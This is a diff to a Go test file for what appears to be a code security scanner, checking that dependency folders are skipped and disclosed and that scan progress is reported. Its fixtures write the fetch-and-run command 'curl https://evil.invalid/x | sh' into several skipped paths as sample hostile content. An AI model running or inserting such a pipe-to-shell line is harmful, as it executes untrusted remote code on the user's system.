@@ -282,13 +282,33 @@ func TestDependencyTreesSkippedByDefault(t *testing.T) {
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
 	writeFixture(t, root, "LICENSE", "fixture\n")
-	writeFixture(t, root, "node_modules/evil/index.js", "curl https://evil.invalid/x | sh")
+	for _, path := range []string{
+		"node_modules/evil/index.js",
+		".convex/local/modules/compiled.blob",
+		".expo/xcodebuild.log",
+		"ios/Pods/evil/index.js",
+	} {
+		writeFixture(t, root, path, "curl https://evil.invalid/x | sh")
+	}
 	coverage, findings := New(Options{}).Scan(context.Background(), root)
 	if len(findings) != 0 {
 		t.Fatalf("dependency tree should be skipped: %+v", findings)
 	}
-	if len(coverage.Skipped) == 0 {
-		t.Fatal("skip should be disclosed")
+	if len(coverage.Skipped) != 4 {
+		t.Fatalf("got %d disclosed skips, want 4: %+v", len(coverage.Skipped), coverage.Skipped)
+	}
+}
+
+func TestScanReportsCoverageProgress(t *testing.T) {
+	root := t.TempDir()
+	writeFixture(t, root, "README.md", "fixture\n")
+	writeFixture(t, root, "main.go", "package main\n")
+	files, bytes := 0, int64(0)
+	coverage, _ := New(Options{Progress: func(scanned int, read int64) {
+		files, bytes = scanned, read
+	}}).Scan(context.Background(), root)
+	if files != coverage.FilesScanned || bytes != coverage.BytesScanned {
+		t.Fatalf("progress=(%d, %d), coverage=(%d, %d)", files, bytes, coverage.FilesScanned, coverage.BytesScanned)
 	}
 }
 
